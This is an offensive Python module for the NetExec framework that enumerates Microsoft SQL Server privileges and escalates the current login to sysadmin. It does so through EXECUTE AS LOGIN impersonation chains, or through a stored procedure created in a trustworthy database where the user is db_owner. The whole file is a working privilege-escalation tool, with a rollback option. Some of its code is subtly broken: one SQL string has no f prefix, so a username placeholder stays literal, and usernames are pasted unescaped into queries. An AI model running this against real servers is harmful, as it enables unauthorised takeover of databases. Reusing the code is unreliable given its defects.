# Author:
#  Romain de Reydellet (@pentest_soka)
from nxc.helpers.logger import highlight


class User:
    def __init__(self, username):
        # current username
        self.username = username
        # user(s) we can impersonate
        self.grantors = []
        self.parent = None
        self.is_sysadmin = False
        self.dbowner = None

    def __str__(self):
        return f"User({self.username})"


class NXCModule:
    """Enumerate MSSQL privileges and exploit them"""

    name = "mssql_priv"
    description = "Enumerate and exploit MSSQL privileges"
    supported_protocols = ["mssql"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.admin_privs = None
        self.current_user = None
        self.current_username = None
        self.mssql_conn = None
        self.action = None
        self.context = None

    def options(self, context, module_options):
        """
        ACTION    Specifies the action to perform:
            - enum_priv (default)
            - privesc
            - rollback (remove sysadmin privilege)
        """
        self.action = None

        if "ACTION" in module_options:
            self.action = module_options["ACTION"]

    def on_login(self, context, connection):
        self.context = context
        # get mssql connection
        self.mssql_conn = connection.conn
        # fetch the current user
        self.current_username = self.get_current_username()
        self.current_user = User(self.current_username)
        self.current_user.is_sysadmin = self.is_admin()
        self.current_user.dbowner = self.check_dbowner_privesc()

        if self.action == "rollback":
            if not self.current_user.is_sysadmin:
                self.context.log.fail(f"{self.current_username} is not sysadmin")
                return
            if self.remove_sysadmin_priv():
                self.context.log.success("sysadmin role removed")
            else:
                self.context.log.success("failed to remove sysadmin role")
            return

        if self.current_user.is_sysadmin:
            self.context.log.success(f"{self.current_username} is already a sysadmin")
            return

        # build path
        self.perform_impersonation_check(self.current_user)
        # look for a privesc path
        target_user = self.browse_path(context, self.current_user, self.current_user)
        if self.action == "privesc":
            if not target_user:
                self.context.log.fail("can't find any path to privesc")
            else:
                exec_as = self.build_exec_as_from_path(target_user)
                # privesc via impersonation privilege
                if target_user.is_sysadmin:
                    self.do_impersonation_privesc(self.current_username, exec_as)
                # privesc via dbowner privilege
                elif target_user.dbowner:
                    self.do_dbowner_privesc(target_user.dbowner, exec_as)
            if self.is_admin_user(self.current_username):
                self.context.log.success(f"{self.current_username} is now a sysadmin! " + highlight(f"({self.context.conf.get('nxc', 'pwn3d_label')})"))

    def build_exec_as_from_path(self, target_user):
        """
        Builds an 'exec_as' path based on the given target user.

        Args:
        ----
            target_user (User): The target user for building the 'exec_as' path.

        Returns:
        -------
            str: The 'exec_as' path built from the target user's username and its parent usernames.
        """
        path = [target_user.username]
        parent = target_user.parent
        while parent:
            path.append(parent.username)
            parent = parent.parent
        # remove the last one
        path.pop(-1)
        return self.sql_exec_as(reversed(path))

    def browse_path(self, context, initial_user: User, user: User) -> User:
        """
        Browse the path of user impersonation.

        Parameters
        ----------
            context (Context): The context of the function.
            initial_user (User): The initial user.
            user (User): The user to browse the path for.

        Returns
        -------
            User: The user that can be impersonated.
        """
        if initial_user.is_sysadmin:
            self.context.log.success(f"{initial_user.username} is sysadmin")
            return initial_user
        elif initial_user.dbowner:
            self.context.log.success(f"{initial_user.username} can privesc via dbowner")
            return initial_user
        for grantor in user.grantors:
            if grantor.is_sysadmin:
                self.context.log.success(f"{user.username} can impersonate: {grantor.username} (sysadmin)")
                return grantor
            elif grantor.dbowner:
                self.context.log.success(f"{user.username} can impersonate: {grantor.username} (which can privesc via dbowner)")
                return grantor
            else:
                self.context.log.display(f"{user.username} can impersonate: {grantor.username}")
            return self.browse_path(context, initial_user, grantor)

    def query_and_get_output(self, query):
        return self.mssql_conn.sql_query(query)

    def sql_exec_as(self, grantors: list) -> str:
        """
        Generates an SQL statement to execute a command using the specified list of grantors.

        Parameters
        ----------
            grantors (list): A list of grantors, each representing a login.

        Returns
        -------
            str: The SQL statement to execute the command using the grantors.
        """
        exec_as = [f"EXECUTE AS LOGIN = '{grantor}';" for grantor in grantors]
        return "".join(exec_as)

    def perform_impersonation_check(self, user: User, grantors=None):
        """
        Performs an impersonation check for a given user.

        Args:
        ----
            user (User): The user for whom the impersonation check is being performed.
            grantors (list): A list of grantors. Default is an empty list.

        Returns:
        -------
            None

        Description:
            This function checks if the user has the necessary privileges to perform impersonation.
            If the user has the necessary privileges, the function returns without performing any further checks.
            If the user does not have the necessary privileges, the function retrieves a list of grantors
            who can impersonate the user and performs the same impersonation check on each grantor recursively.
            If a new grantor is found, it is added to the list of grantors and the impersonation check is performed on it.

        Example Usage:
            perform_impersonation_check(user, grantors=['admin', 'manager'])

        """
        # build EXECUTE AS if any grantors is specified
        if grantors is None:
            grantors = []
        exec_as = self.sql_exec_as(grantors)
        # do we have any privilege ?
        if self.update_priv(user, exec_as):
            return
        # do we have any grantors ?
        new_grantors = self.get_impersonate_users(exec_as)
        for new_grantor in new_grantors:
            # skip the case when we can impersonate ourself
            if new_grantor == user.username:
                continue
            # create a new user and add it as a grantor of the current user
            if new_grantor not in grantors:
                new_user = User(new_grantor)
                new_user.parent = user
                user.grantors.append(new_user)
                grantors.append(new_grantor)
                # perform the same check on the grantor
                self.perform_impersonation_check(new_user, grantors)

    def update_priv(self, user: User, exec_as=""):
        """
        Update the privileges of a user.

        Args:
        ----
            user (User): The user whose privileges need to be updated.
            exec_as (str): The username of the user executing the function.

        Returns:
        -------
            bool: True if the user is an admin user and their privileges are updated successfully, False otherwise.
        """
        if self.is_admin_user(user.username):
            user.is_sysadmin = True
            return True
        user.dbowner = self.check_dbowner_privesc(exec_as)
        return user.dbowner

    def get_current_username(self) -> str:
        """
        Retrieves the current username.

        :param self: The instance of the class.
        :return: The current username as a string.
        :rtype: str
        """
        return self.query_and_get_output("select SUSER_NAME()")[0][""]

    def is_admin(self, exec_as="") -> bool:
        """
        Checks if the user is an admin.

        Args:
        ----
            exec_as (str): The user to execute the query as. Default is an empty string.

        Returns:
        -------
            bool: True if the user is an admin, False otherwise.
        """
        res = self.query_and_get_output(exec_as + "SELECT IS_SRVROLEMEMBER('sysadmin')")
        self.revert_context(exec_as)
        is_admin = res[0][""]
        self.context.log.debug(f"IsAdmin Result: {is_admin}")
        if is_admin:
            self.context.log.debug("User is admin!")
            self.admin_privs = True
            return True
        else:
            return False

    def get_databases(self, exec_as="") -> list:
        """
        Retrieves a list of databases from the SQL server.

        Args:
        ----
            exec_as (str, optional): The username to execute the query as. Defaults to "".

        Returns:
        -------
            list: A list of database names.
        """
        res = self.query_and_get_output(exec_as + "SELECT name FROM master..sysdatabases")
        self.revert_context(exec_as)
        self.context.log.debug(f"Response: {res}")
        self.context.log.debug(f"Response Type: {type(res)}")
        return [table["name"] for table in res]

    def is_db_owner(self, database, exec_as="") -> bool:
        """
        Check if the specified database is owned by the current user.

        Args:
        ----
            database (str): The name of the database to check.
            exec_as (str, optional): The name of the user to execute the query as. Defaults to "".

        Returns:
        -------
            bool: True if the database is owned by the current user, False otherwise.
        """
        query = f"""
            SELECT rp.name AS database_role
            FROM [{database}].sys.database_role_members drm
            JOIN [{database}].sys.database_principals rp ON (drm.role_principal_id = rp.principal_id)
            JOIN [{database}].sys.database_principals mp ON (drm.member_principal_id = mp.principal_id)
            WHERE rp.name = 'db_owner' AND mp.name = SYSTEM_USER
        """
        res = self.query_and_get_output(exec_as + query)
        if res and "database_role" in res[0] and res[0]["database_role"] == "db_owner":
            return True
        return False

    def find_dbowner_priv(self, databases, exec_as="") -> list:
        """
        Finds the list of databases for which the specified user is the owner.

        Args:
        ----
            databases (list): A list of database names.
            exec_as (str, optional): The user to execute the check as. Defaults to "".

        Returns:
        -------
            list: A list of database names for which the specified user is the owner.
        """
        return [database for database in databases if self.is_db_owner(database, exec_as)]

    def find_trusted_databases(self, exec_as="") -> list:
        """
        Find trusted databases.

        :param exec_as: The user under whose context the query should be executed. Defaults to an empty string.
        :type exec_as: str
        :return: A list of trusted database names.
        :rtype: list
        """
        query = """
                SELECT d.name AS DATABASENAME
                FROM sys.server_principals r
                INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
                INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id
                INNER JOIN sys.databases d ON suser_sname(d.owner_sid) = p.name
                WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB')
                AND r.type = 'R' AND r.name = N'sysadmin'
            """
        result = self.query_and_get_output(exec_as + query)
        self.revert_context(exec_as)
        return result

    def check_dbowner_privesc(self, exec_as=""):
        """
        Check if a database owner has privilege escalation.

        :param exec_as: The user to execute the check as. Defaults to an empty string.
        :type exec_as: str
        :return: The first trusted database that has a database owner with privilege escalation, or None if no such database is found.
        :rtype: str or None
        """
        databases = self.get_databases(exec_as)
        dbowner_privileged_databases = self.find_dbowner_priv(databases, exec_as)
        trusted_databases = self.find_trusted_databases(exec_as)

        for db in dbowner_privileged_databases:
            if db in trusted_databases:
                return db

    def do_dbowner_privesc(self, database, exec_as=""):
        """
        Executes a series of SQL queries to perform a database owner privilege escalation.

        Args:
        ----
            database (str): The name of the database to perform the privilege escalation on.
            exec_as (str, optional): The username to execute the queries as. Defaults to "".

        Returns:
        -------
            None
        """
        self.query_and_get_output(exec_as)
        self.query_and_get_output(f"use {database};")

        query = """CREATE PROCEDURE sp_elevate_me
            WITH EXECUTE AS OWNER
            as
            begin
            EXEC sp_addsrvrolemember '{self.current_username}','sysadmin'
            end"""
        self.query_and_get_output(query)

        self.query_and_get_output("EXEC sp_elevate_me;")
        self.query_and_get_output("DROP PROCEDURE sp_elevate_me;")

        self.revert_context(exec_as)

    def do_impersonation_privesc(self, username, exec_as=""):
        """
        Perform an impersonation privilege escalation by changing the context to the specified user and granting them 'sysadmin' role.

        :param username: The username of the user to escalate privileges for.
        :type username: str
        :param exec_as: The username to execute the query as. Defaults to an empty string.
        :type exec_as: str, optional

        :return: None
        :rtype: None
        """
        # change context if necessary
        self.query_and_get_output(exec_as)
        # update our privilege
        self.query_and_get_output(f"EXEC sp_addsrvrolemember '{username}', 'sysadmin'")
        self.revert_context(exec_as)

    def get_impersonate_users(self, exec_as="") -> list:
        """
        Retrieves a list of users who have the permission to impersonate other users.

        Args:
        ----
            exec_as (str, optional): The context in which the query will be executed. Defaults to "".

        Returns:
        -------
            list: A list of user names who have the permission to impersonate other users.
        """
        query = """SELECT DISTINCT b.name
                   FROM  sys.server_permissions a
                   INNER JOIN sys.server_principals b
                   ON a.grantor_principal_id = b.principal_id
                   WHERE a.permission_name like 'IMPERSONATE%'"""
        res = self.query_and_get_output(exec_as + query)
        self.revert_context(exec_as)
        return [user["name"] for user in res]

    def remove_sysadmin_priv(self) -> bool:
        """
        Remove the sysadmin privilege from the current user.

        :return: True if the sysadmin privilege was successfully removed, False otherwise.
        :rtype: bool
        """
        self.query_and_get_output(f"EXEC sp_dropsrvrolemember '{self.current_username}', 'sysadmin'")
        return not self.is_admin()

    def is_admin_user(self, username) -> bool:
        """
        Check if the given username belongs to an admin user.

        :param username: The username to check.
        :type username: str
        :return: True if the username belongs to an admin user, False otherwise.
        :rtype: bool
        """
        res = self.query_and_get_output(f"SELECT IS_SRVROLEMEMBER('sysadmin', '{username}')")
        is_admin = res[0][""]
        if is_admin:
            self.admin_privs = True
            return True
        else:
            return False

    def revert_context(self, exec_as):
        """
        Reverts the context for the specified user.

        Parameters
        ----------
            exec_as (str): The user for whom the context should be reverted.

        Returns
        -------
            None
        """
        self.query_and_get_output("REVERT;" * exec_as.count("EXECUTE"))
